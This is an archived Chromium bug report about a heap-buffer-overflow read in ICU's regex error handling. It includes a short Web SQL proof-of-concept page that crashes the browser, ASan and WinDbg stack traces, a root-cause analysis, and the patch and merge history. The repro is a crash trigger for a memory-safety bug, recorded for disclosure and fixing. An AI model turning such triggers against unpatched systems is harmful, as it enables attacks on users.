# Heap-buffer-overflow in ucstrTextExtract

| Field | Value |
|-------|-------|
| **Issue ID** | [40073442](https://issues.chromium.org/issues/40073442) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Internals |
| **Reporter** | ax...@gmail.com |
| **Assignee** | js...@chromium.org |
| **Created** | 2012-09-12 |
| **Bounty** | $500.00 |

## Description

**VULNERABILITY DETAILS**  

Heap buffer overflow happens in web database regexp while trying to report regular expression rule parsing error.

**VERSION**  

Version 23.0.1264.0 (156197) Ubuntu x64,  

Could not reproduce with the same repro on stable versions of Mac and Windows and on Windows canary. But it seems that the bug is also present in Windows 23.0.1263.1 canary, because while running the same regexp-fuzzer, crash happens with the similar stack (see below). Probably it just requires regexp modification.  

PS: at the moment I am unable to build Chrome (currently using public builds), so ASan log is not full. But it reproduces on Linux for me very well.

**REPRODUCTION CASE**

<script>
var db = openDatabase('test', '1.0', 'AAAA', 1024);
db.transaction(function(h) {
h.executeSql('CREATE TABLE IF NOT EXISTS tableAAAA (text)');
h.executeSql('INSERT INTO tableAAAA VALUES ("aaaa")');
});
db.transaction(function(h) {
h.executeSql('SELECT \\* from tableAAAA WHERE text REGEXP "(\\*)"');
});
</script>
# **FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**

==25987== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7f8a68bf0b64 at pc 0x7f8a75d45049 bp 0x7f8a630fcd30 sp 0x7f8a630fcd28  

READ of size 2 at 0x7f8a68bf0b64 thread T4  

#0 0x7f8a75d45048 in ucstrTextExtract /b/build/slave/ASAN\_Release\_\_symbolized\_/build/third\_party/icu/source/common/utext.cpp:2882  

#1 0x7f8a75bf6134 in icu\_46::RegexCompile::error(UErrorCode) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/third\_party/icu/source/i18n/regexcmp.cpp:3604  

#2 0x7f8a75befe3f in icu\_46::RegexCompile::doParseActions(int) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/third\_party/icu/source/i18n/regexcmp.cpp:1740  

#3 0x7f8a75bee1c2 in icu\_46::RegexCompile::compile(UText\*, UParseError&, UErrorCode&) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/third\_party/icu/source/i18n/regexcmp.cpp:221  

#4 0x7f8a75b3bd61 in icu\_46::RegexPattern::compile(UText\*, unsigned int, UParseError&, UErrorCode&) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/third\_party/icu/source/i18n/repattrn.cpp:360  

#5 0x7f8a75b3beef in icu\_46::RegexPattern::compile(UText\*, unsigned int, UErrorCode&) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/third\_party/icu/source/i18n/repattrn.cpp:416  

#6 0x7f8a7a8e34d3 in  

#7 0x7f8a7690fd28 in  

#8 0x7f8a769f1293 in  

#9 0x7f8a768f3449 in  

#10 0x7f8a768f2d14 in  

#11 0x7f8a7adb1aa6 in  

#12 0x7f8a77ac1e7d in  

#13 0x7f8a773d667c in  

#14 0x7f8a773d6132 in  

#15 0x7f8a773d48d7 in  

#16 0x7f8a773cc1de in  

#17 0x7f8a773cbc93 in  

#18 0x7f8a773ccd0f in  

#19 0x7f8a7ab55152 in  

#20 0x7f8a765eeb6e in  

#21 0x7f8a7b40267a in  

0x7f8a68bf0b64 is located 28 bytes to the left of 8-byte region [0x7f8a68bf0b80,0x7f8a68bf0b88)  

allocated by thread T4 here:  

#0 0x7f8a7b3ffa90 in  

#1 0x7f8a7a8e3211 in  

#2 0x7f8a7690fd28 in  

#3 0x7f8a769f1293 in  

#4 0x7f8a768f3449 in  

#5 0x7f8a768f2d14 in  

#6 0x7f8a7adb1aa6 in  

#7 0x7f8a77ac1e7d in  

#8 0x7f8a773d667c in  

#9 0x7f8a773d6132 in  

#10 0x7f8a773d48d7 in  

#11 0x7f8a773cc1de in  

#12 0x7f8a773cbc93 in  

#13 0x7f8a773ccd0f in  

#14 0x7f8a7ab55152 in  

#15 0x7f8a765eeb6e in  

#16 0x7f8a7b40267a in  

Thread T4 created by T0 here:  

#0 0x7f8a7b3fbcc4 in  

#1 0x7f8a765ee9ee in  

#2 0x7f8a7ab55011 in  

#3 0x7f8a773cc98f in  

#4 0x7f8a773cb3a6 in  

#5 0x7f8a77abb825 in  

#6 0x7f8a77abb29d in  

#7 0x7f8a7ae21329 in  

#8 0x7f8a78211c7f in  

#9 0x7f8a76a9cfc0 in  

#10 0x3f549ae0618d in  

#11 0x3f549ae3d107 in  

#12 0x3f549ae24006 in  

#13 0x3f549ae112d6 in  

#14 0x7f8a76ae635b in  

#15 0x7f8a76a54dfb in  

#16 0x7f8a7746ad10 in  

#17 0x7f8a77453ab0 in  

#18 0x7f8a77454004 in  

#19 0x7f8a7679bf22 in  

#20 0x7f8a76799c1c in  

#21 0x7f8a771185bc in  

#22 0x7f8a77118311 in  

#23 0x7f8a77110e2a in  

#24 0x7f8a77110fd6 in  

#25 0x7f8a771108bf in  

#26 0x7f8a77111a49 in  

#27 0x7f8a7ab5de2d in  

#28 0x7f8a778441df in  

#29 0x7f8a7657ea29 in  

#30 0x7f8a7784432c in  

#31 0x7f8a778ab8f1 in  

#32 0x7f8a77894dab in  

#33 0x7f8a778ac693 in  

#34 0x7f8a76019b2d in  

#35 0x7f8a7601b828 in  

#36 0x7f8a76017f88 in  

#37 0x7f8a76017340 in  

#38 0x7f8a75f0224c in  

#39 0x7f8a756141f2 in  

#40 0x7f8a7561ac67 in  

#41 0x7f8a75521882 in  

#42 0x7f8a7552204c in  

#43 0x7f8a75522361 in  

#44 0x7f8a7552e74c in  

#45 0x7f8a7552107b in  

#46 0x7f8a7555a2c2 in  

#47 0x7f8a7551fda6 in  

#48 0x7f8a79ef4be2 in  

#49 0x7f8a753fd1ea in  

#50 0x7f8a753fdc98 in  

#51 0x7f8a753fe9aa in  

#52 0x7f8a753fc96e in  

#53 0x7f8a745e5186 in  

#54 0x7f8a745e50ea in  

#55 0x7f8a6d494d8d in \_\_libc\_start\_main /build/buildd/eglibc-2.12.1/csu/libc-start.c:226  

Shadow byte and word:  

0x1ff14d17e16c: fa  

0x1ff14d17e168: fa fa fa fa fa fa fa fa  

More shadow bytes:  

0x1ff14d17e148: fa fa fa fa fa fa fa fa  

0x1ff14d17e150: 04 fb fb fb fb fb fb fb  

0x1ff14d17e158: fb fb fb fb fb fb fb fb  

0x1ff14d17e160: fa fa fa fa fa fa fa fa  

=>0x1ff14d17e168: fa fa fa fa fa fa fa fa  

0x1ff14d17e170: 00 fb fb fb fb fb fb fb  

0x1ff14d17e178: fb fb fb fb fb fb fb fb  

0x1ff14d17e180: fa fa fa fa fa fa fa fa  

0x1ff14d17e188: fa fa fa fa fa fa fa fa  

Stats: 9M malloced (9M for red zones) by 17490 calls  

Stats: 1M realloced by 472 calls  

Stats: 7M freed by 10034 calls  

Stats: 0M really freed by 0 calls  

Stats: 52M (13321 full pages) mmaped in 13 calls  

mmaps by size class: 8:16383; 9:8191; 10:4095; 11:2047; 12:1024; 13:512; 14:256; 15:128; 16:128; 17:32; 18:16; 19:8;  

mallocs by size class: 8:13918; 9:896; 10:1832; 11:309; 12:181; 13:51; 14:152; 15:37; 16:108; 17:4; 18:1; 19:1;  

frees by size class: 8:7201; 9:444; 10:1727; 11:192; 12:154; 13:40; 14:140; 15:30; 16:101; 17:3; 18:1; 19:1;  

rfrees by size class:  

Stats: malloc large: 6 small slow: 159  

==25987== ABORTING

WinDbg:

0:009:x86> kp  

ChildEBP RetAddr  

0493f32c 562ff6f9 chrome\_55190000!ucstrTextExtract(struct UText \* ut = 0x1096c150, int64 start = 0n-9, int64 limit = 0n6, wchar\_t \* dest = 0x0493f5d4 "", int destCapacity = 0n16, UErrorCode \* pErrorCode = 0x0493f390)+0x89 [c:\b\build\slave\win\build\src\third\_party\icu\source\common\utext.cpp @ 2871]  

0493f354 562c5178 chrome\_55190000!utext\_extract\_46(struct UText \* ut = 0x1096c150, int64 start = 0n-9, int64 limit = 0n6, wchar\_t \* dest = 0x0493f5d4 "", int destCapacity = 0n16, UErrorCode \* status = 0x0493f390)+0x22 [c:\b\build\slave\win\build\src\third\_party\icu\source\common\utext.cpp @ 423]  

0493f388 562c8165 chrome\_55190000!icu\_46::RegexCompile::error(UErrorCode e = U\_ZERO\_ERROR (0n0))+0xa1 [c:\b\build\slave\win\build\src\third\_party\icu\source\i18n\regexcmp.cpp @ 3605]  

0493f3d8 562c840f chrome\_55190000!icu\_46::RegexCompile::doParseActions(int action = 0n6)+0x1139 [c:\b\build\slave\win\build\src\third\_party\icu\source\i18n\regexcmp.cpp @ 1732]  

0493f3f0 562bace7 chrome\_55190000!icu\_46::RegexCompile::compile(struct UText \* pat = 0x0493f638, struct UParseError \* pp = 0x0493f5cc, UErrorCode \* e = 0x0493f6dc)+0xff [c:\b\build\slave\win\build\src\third\_party\icu\source\i18n\regexcmp.cpp @ 221]  

0493f5b4 562bad4e chrome\_55190000!icu\_46::RegexPattern::compile(struct UText \* regex = 0x0493f638, unsigned int flags = 0, struct UParseError \* pe = 0x0493f5cc, UErrorCode \* status = 0x0493f6dc)+0xb6 [c:\b\build\slave\win\build\src\third\_party\icu\source\i18n\repattrn.cpp @ 362]  

0493f618 562b869a chrome\_55190000!icu\_46::RegexPattern::compile(struct UText \* regex = 0x0493f638, unsigned int flags = 0, UErrorCode \* err = 0x0493f6dc)+0x24 [c:\b\build\slave\win\build\src\third\_party\icu\source\i18n\repattrn.cpp @ 417]  

0493f6b4 5628d215 chrome\_55190000!uregex\_open\_46(wchar\_t \* pattern = 0x0ae764e8 "[;-=4-0,E-Kd-t.-;,]{1}[,B8-86-1,]{,3}+[???", int patternLength = 0n-1, unsigned int flags = 0, struct UParseError \* pe = 0x00000000, UErrorCode \* status = 0x0493f6dc)+0x15c [c:\b\build\slave\win\build\src\third\_party\icu\source\i18n\uregex.cpp @ 156]  

0493f6e0 55374b1d chrome\_55190000!icuRegexpFunc(struct sqlite3\_context \* p = 0x0493f764, int nArg = 0n2, struct Mem \*\* apArg = 0x05896308)+0x52 [c:\b\build\slave\win\build\src\third\_party\sqlite\amalgamation\sqlite3.c @ 125765]  

0493f820 55373e5c chrome\_55190000!sqlite3VdbeExec(struct Vdbe \* p = 0xfffffff7)+0xbe6 [c:\b\build\slave\win\build\src\third\_party\sqlite\amalgamation\sqlite3.c @ 63843]  

0493f840 55373c3b chrome\_55190000!sqlite3Step(struct Vdbe \* p = 0x00000000)+0xaf [c:\b\build\slave\win\build\src\third\_party\sqlite\amalgamation\sqlite3.c @ 60869]  

0493f920 55ec7380 chrome\_55190000!sqlite3\_step(struct sqlite3\_stmt \* pStmt = 0x0cea3688)+0x5b [c:\b\build\slave\win\build\src\third\_party\sqlite\amalgamation\sqlite3.c @ 60935]  

0493f930 55f3f21b chrome\_55190000!WebCore::SQLiteStatement::step(void)+0x40 [c:\b\build\slave\win\build\src\third\_party\webkit\source\webcore\platform\sql\sqlitestatement.cpp @ 105]  

0493f988 55b1baa2 chrome\_55190000!WebCore::SQLStatement::execute(<Type information missing error> db = <Type information missing error>)+0x347 [c:\b\build\slave\win\build\src\third\_party\webkit\source\webcore\modules\webdatabase\sqlstatement.cpp @ 116]  

0493f998 55b1b957 chrome\_55190000!WebCore::SQLTransaction::runCurrentStatement(void)+0x47 [c:\b\build\slave\win\build\src\third\_party\webkit\source\webcore\modules\webdatabase\sqltransaction.cpp @ 401]  

0493f9ac 55a737a8 chrome\_55190000!WebCore::SQLTransaction::runStatements(void)+0x7c [c:\b\build\slave\win\build\src\third\_party\webkit\source\webcore\modules\webdatabase\sqltransaction.cpp @ 372]  

0493f9b8 55abc2b6 chrome\_55190000!WebCore::Database::DatabaseTransactionTask::doPerformTask(void)+0x17 [c:\b\build\slave\win\build\src\third\_party\webkit\source\webcore\modules\webdatabase\databasetask.cpp @ 157]  

0493fa04 55abc23c chrome\_55190000!WebCore::DatabaseThread::databaseThread+0x76 [c:\b\build\slave\win\build\src\third\_party\webkit\source\webcore\modules\webdatabase\databasethread.cpp @ 107]  

0493fa10 56b2c3d3 chrome\_55190000!WebCore::DatabaseThread::databaseThreadStart+0xc [c:\b\build\slave\win\build\src\third\_party\webkit\source\webcore\modules\webdatabase\databasethread.cpp @ 94]  

0493fa2c 5649fb15 chrome\_55190000!WTF::threadEntryPoint(void \* contextData = 0x0b19f630)+0x3d [c:\b\build\slave\win\build\src\third\_party\webkit\source\wtf\wtf\threading.cpp @ 69]  

0493fa40 55263184 chrome\_55190000!WTF::wtfThreadEntryPoint+0x13 [c:\b\build\slave\win\build\src\third\_party\webkit\source\wtf\wtf\threadingwin.cpp @ 217]  

0493fa78 55263148 chrome\_55190000!\_callthreadstartex(void)+0x1b [f:\dd\vctools\crt\_bld\self\_x86\crt\src\threadex.c @ 314]  

0493fa84 75bd339a chrome\_55190000!\_threadstartex(void \* ptd = 0x058d66c0)+0x64 [f:\dd\vctools\crt\_bld\self\_x86\crt\src\threadex.c @ 292]  

0493fa90 77a09ef2 KERNEL32!BaseThreadInitThunk+0xe  

0493fad0 77a09ec5 ntdll\_779d0000!\_\_RtlUserThreadStart+0x70  

0493fae8 00000000 ntdll\_779d0000!\_RtlUserThreadStart+0x1b  

0:009:x86> dv  

ut = 0x1096c150  

start = 0n-9  

limit = 0n6  

dest = 0x0493f5d4 ""  

destCapacity = 0n16  

pErrorCode = 0x0493f390  

limit32 = 0n6  

strLength = 0n-1

## Timeline

### ke...@chromium.org (2012-09-12)

Cluster-fuzz report: https://cluster-fuzz.appspot.com/testcase?key=107610732

### in...@chromium.org (2012-09-12)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=107610732

Uploader: kenrb@chromium.org

Crash Type: Heap-buffer-overflow READ 2
Crash Address: 0x7eff7ac58064
Crash State:
  - crash stack -
  ucstrTextExtract
  icu_46::RegexCompile::error
  icu_46::RegexCompile::doParseActions
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=114961:114982

Minimized Testcase (0.35 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv95TgVb-GAu25w4Sl9f1-NIYVaFpgYfRqjoOVjn9_aa5SdmeMBJDbQzC-7P5dN2a7Y9oQZ5ju917EW6BU-OnEcUI3dEexZjuryLAObWD95e8C_vc3fM-IFlzJ5b8c9EFJmAwuydpSG5jQHx-2rOpFGSoS4Ieg7tN3vtuAtBRc_cIw2zxvBc
<script>
    var db = openDatabase('test', '1.0', 'AAAA', 1024);

    db.transaction(function(h) {
        h.executeSql('CREATE TABLE IF NOT EXISTS tableAAAA (text)');
        h.executeSql('INSERT INTO tableAAAA VALUES ("aaaa")');
    });
    db.transaction(function(h) {
        h.executeSql('SELECT * from tableAAAA WHERE text REGEXP "(*)"');
    });
</script>

### sc...@gmail.com (2012-09-21)

I will try and get to it, but I can't promise to get to it within a month :-(

@jshin: if you are listening, and were able to take a look, you'd be considered a bit of a saviour.

### ts...@chromium.org (2012-09-21)

lemme take a quick peek at this.

### sc...@gmail.com (2012-09-21)

Thanks, Tom. It feels "easy" :)

### ts...@chromium.org (2012-09-21)

Ah. RegexCompile::error() around line regexcmp.cpp:3600, expects utext_extract() to clip the negative index it is supplying:
        // Fill in the context.
        //   Note: extractBetween() pins supplied indicies to the string bounds.
        ...
        utext_extract(fRXPat->fPattern, fScanIndex-U_PARSE_CONTEXT_LEN+1, fScanIndex, fParseErr->preContext, U_PARSE_CONTEXT_LEN, &status);
        ...

utext_extract() eventually winds up in ucstrTextExtract(), which intends to deal with negative start indices around line utext.cpp:2855:
    // Access the start.  Does two things we need:
    //   Pins 'start' to the length of the string, if it came in out-of-bounds.
    //   Snaps 'start' to the beginning of a code point.
    ucstrTextAccess(ut, start, TRUE);
    U_ASSERT(start <= INT32_MAX);
    start32 = (int32_t)start;

Unfortunately for this code, ucstrTextAccess() can't update start because it is passed by value, not reference, around line utext.cpp:2747:
    static UBool U_CALLCONV
    ucstrTextAccess(UText *ut, int64_t index, UBool  forward) {

and instead returns the clipped value as: 
    ut->chunkOffset = (int32_t)index;



### ts...@chromium.org (2012-09-21)

And hence this patch avoids the issue.

Index: third_party/icu/source/common/utext.cpp
===================================================================
--- third_party/icu/source/common/utext.cpp	(revision 149334)
+++ third_party/icu/source/common/utext.cpp	(working copy)
@@ -2856,6 +2856,7 @@
     //   Pins 'start' to the length of the string, if it came in out-of-bounds.
     //   Snaps 'start' to the beginning of a code point.
     ucstrTextAccess(ut, start, TRUE);
+    start = ut->chunkOffset;
     U_ASSERT(start <= INT32_MAX);
     start32 = (int32_t)start;

jshin, please evaluate and apply.  thanks.

### js...@chromium.org (2012-09-21)

Thank you for taking a look and sorry that I didn't reply here. I was trying to get hold of an ICU contributor most familiar with this part of the code, but he's been ooo for a while and I haven't managed to take a look myself. 

I'm looking at your patch now and will get back here very soon. 


### js...@chromium.org (2012-09-21)

It looks like we need one more change. The upstream fix is in http://bugs.icu-project.org/trac/ticket/8267

I'll merge that change back to our copy of ICU. 



### sc...@gmail.com (2012-09-21)

Thanks! Can you roll ICU too and perhaps even be a real superstar and roll the fix into the M22 branch, assuming it's super safe?

### js...@chromium.org (2012-09-21)

Sure, I'll do. 



### js...@chromium.org (2012-09-21)

The CL is up at http://codereview.chromium.org/10957050/


### js...@chromium.org (2012-09-22)

Landed: 
Fix a heap buffer overaflow in ucstrTextExtract 

Merge the upstream patch http://bugs.icu-project.org/trac/changeset/29356 

BUG=148692
TEST=See the bug report. 
Committed: https://src.chromium.org/viewvc/chrome?view=rev&revision=158118

-------

r158118 is also pulled in by updating DEPS. 



### js...@chromium.org (2012-09-22)

https://chromereviews.googleplex.com/4966013/ for M23 and https://chromereviews.googleplex.com/4966014 for M22

I think the patch is rather safe. @scarybeasts or @tepez, would you approve the merge to branches? 

This is marked for M-21. So, should I merge this to M21 as well? M22 will be on a stable channel, soon, won't it? 


### sc...@gmail.com (2012-09-22)

Thank you sir. Yes, M21 is finished. So the first release we can get this into is M22. I've adjusted the Mstone label.

I also added the Merge-Approved label so please proceed for M22, M23 !

### sc...@gmail.com (2012-09-22)

Rolled to trunk DEPS here: http://src.chromium.org/viewvc/chrome?view=rev&revision=158135

### cl...@chromium.org (2012-09-22)

ClusterFuzz has detected this issue as fixed in range 158017:158179.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=107610732

Uploader: kenrb@chromium.org

Crash Type: Heap-buffer-overflow READ 2
Crash Address: 0x7eff7ac58064
Crash State:
  - crash stack -
  ucstrTextExtract
  icu_46::RegexCompile::error
  icu_46::RegexCompile::doParseActions
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=114961:114982
Fixed: https://cluster-fuzz.appspot.com/revisions?range=158017:158179

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv95TgVb-GAu25w4Sl9f1-NIYVaFpgYfRqjoOVjn9_aa5SdmeMBJDbQzC-7P5dN2a7Y9oQZ5ju917EW6BU-OnEcUI3dEexZjuryLAObWD95e8C_vc3fM-IFlzJ5b8c9EFJmAwuydpSG5jQHx-2rOpFGSoS4Ieg7tN3vtuAtBRc_cIw2zxvBc

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### sc...@gmail.com (2012-09-24)

@jshin: any joy with the merges? I approved as requested.

### ke...@google.com (2012-09-24)

If this is merged, please update the labels.

### js...@chromium.org (2012-09-25)

It's just been merged to M22 branch (1229). How about M23 branch (1271)? 


### js...@chromium.org (2012-09-25)

Oh. I'm approved for M23 as well. I'm merging it now.  Done !


### js...@chromium.org (2012-09-25)

[Comment Deleted]

### sc...@gmail.com (2012-09-26)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-10-02)

Thank you Arthur. Strange bug, although I can't see any particular severity to it.
$500

### sc...@gmail.com (2012-10-02)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-10-12)

Paid as part of $1500 batch

### bu...@chromium.org (2012-11-14)

The following revision refers to this bug:
    http://goto.ext.google.com/viewvc/chrome-internal?view=rev&revision=29077

------------------------------------------------------------------------
r29077 | jungshik@google.com | 2012-09-25T20:29:17.932763Z

------------------------------------------------------------------------

### bu...@chromium.org (2012-11-14)

The following revision refers to this bug:
    http://goto.ext.google.com/viewvc/chrome-internal?view=rev&revision=29078

------------------------------------------------------------------------
r29078 | jungshik@google.com | 2012-09-25T20:31:51.203808Z

------------------------------------------------------------------------

### js...@chromium.org (2012-12-20)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-01-05)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/148692?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40073442)*
